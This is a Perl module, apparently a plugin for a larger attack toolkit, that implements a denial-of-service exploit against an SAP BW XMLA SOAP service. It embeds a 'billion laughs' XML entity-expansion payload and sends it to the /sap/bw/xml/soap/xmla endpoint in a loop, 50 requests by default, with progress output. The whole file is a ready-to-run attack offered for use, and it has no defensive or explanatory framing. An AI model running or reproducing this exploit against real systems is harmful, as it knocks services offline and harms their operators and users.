#!/usr/bin/perl
# Module DoS Exploit (XML DOCTYPE)

# CONFIG
######################
my $desc ="XMLA BW service (/sap/bw/xml/soap/xmla) DoS Exploit (XML Enities Expansion) \n\t Usage: black.pl .. .. -m id_module <num> - count of requests, default is 50\n"; 
our $funcName="xml_entity_dos_Func";

######################
push(@descriptions,$desc);
push(@functions,$funcName);
######################


# Special function
######################

sub xml_entity_dos_Func()
{
	my $XML='
	<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
  <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
  <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
  <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
  <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
	';

	if ($ARGV[$m_arg_i+1]){
		$num=$ARGV[$m_arg_i+1];
		print $num." - num \n\n";
	} else {
		$num=50;
	}
	
	print "Start DoS!\n";
	for (my $i=0;$i<$num;$i++)
	{
		send_soap($XML,0,'/sap/bw/xml/soap/xmla');
		$prc = int($i*100/$num);
		
		if(($prc%10)==0)
			{ print "$prc% - Done! ($i-$num)\n"; };
	}
	
	print "\n";
	
	
	

}